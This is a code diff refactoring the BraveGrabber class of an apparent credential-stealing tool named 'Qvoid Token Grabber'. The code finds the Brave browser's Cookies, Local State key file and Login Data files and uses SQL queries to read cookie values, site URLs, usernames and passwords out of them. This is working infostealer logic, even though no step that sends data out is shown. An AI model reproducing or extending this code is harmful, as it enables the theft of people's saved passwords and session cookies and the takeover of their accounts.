@@ -14,24 +14,13 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
 {
     class BraveGrabber
     {
-        public string BraveCookiePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\BraveSoftware\Brave-Browser\User Data\Default\Cookies";
-        public string BraveKeyPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\BraveSoftware\Brave-Browser\User Data\Local State";
-        public string BravePasswordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\BraveSoftware\Brave-Browser\User Data\Default\Login Data";
+        public string BraveCookiePath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\BraveSoftware\Brave-Browser\User Data\Default\Cookies", BraveKeyPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\BraveSoftware\Brave-Browser\User Data\Local State", BravePasswordPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\BraveSoftware\Brave-Browser\User Data\Default\Login Data";
 
-        public bool CookiesExists()
-        {
-            return File.Exists(BraveCookiePath);
-        }
+        public bool CookiesExists() => File.Exists(BraveCookiePath);
 
-        public bool PasswordsExists()
-        {
-            return File.Exists(BravePasswordPath);
-        }
+        public bool PasswordsExists() => File.Exists(BravePasswordPath);
 
-        public bool KeyExists()
-        {
-            return File.Exists(BraveKeyPath);
-        }
+        public bool KeyExists() => File.Exists(BraveKeyPath);
 
         public List<Cookie> GetCookiesByHostname(string hostName, byte[] key)
         {
@@ -71,7 +60,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={BraveCookiePath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";
+                    cmd.CommandText = "SELECT name,encrypted_value,host_key FROM cookies";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -131,7 +120,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={BravePasswordPath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+                    cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
